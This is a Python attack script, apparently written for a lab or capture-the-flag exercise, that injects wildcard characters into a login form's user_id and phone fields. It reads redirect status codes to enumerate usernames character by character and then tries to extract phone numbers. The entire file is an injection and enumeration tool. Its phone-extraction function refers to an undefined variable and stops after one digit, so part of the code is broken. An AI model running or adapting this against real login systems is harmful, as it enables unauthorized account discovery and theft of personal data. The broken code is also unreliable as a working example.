#!/usr/bin/python3

import requests
import time
import sys
import signal
import string
from pwn import *

# ctrl_c
def def_handler(sig, frame):
        print ("\n\n[!] Saliendo...\n")
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = input("URL Target: ")
burp = {'http': 'http://127.0.0.1:8080'}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

def getInitUsers():
        characters = string.ascii_lowercase + string.digits
        initial_users = []
        for ch4r in characters:
                DATA = "user_id={}*&password=*&login=1&sumbit=Sumbit".format(ch4r)
                r = requests.post(url, data=DATA, headers=headers, allow_redirects=False, proxies=burp)
                if r.status_code == 301:
                        initial_users.append(ch4r)
        return initial_users

def getUsers(initial_users):
        username = []    
        characters = string.ascii_lowercase + string.digits
        for first_char in initial_users:
                user=""  
                for long in range(0, 20):
                        for ch4r in characters:
                                DATA = "user_id={}{}{}*&password=*&login=1&sumbit=Sumbit".format(first_char, user, ch4r)
                                r = requests.post(url, data=DATA, headers=headers, allow_redirects=False)
                                if r.status_code == 301:
                                        user += ch4r
                                        break
                username.append(first_char + user)
        return username

def getPhone(username): 
        numbers = string.digits
        correct_num = [] 
        for num in numbers:
                DATA = "user_id={}&phone={}{}*&password=*&login=1&sumbit=Sumbit".format(username, user, num)  # Reemplazar phone_try por user
                r = requests.post(url, data=DATA, headers=headers, allow_redirects=False)
                if r.status_code == 301:
                        correct_num.append(num)
                        break
        return correct_num

if __name__ == '__main__':
        initial_users = getInitUsers()
        usernames = getUsers(initial_users)
        phone_numbers = []
        for username in usernames:
            number_phone = getPhone(username)
            phone_numbers.append((username, number_phone))
        print(phone_numbers)
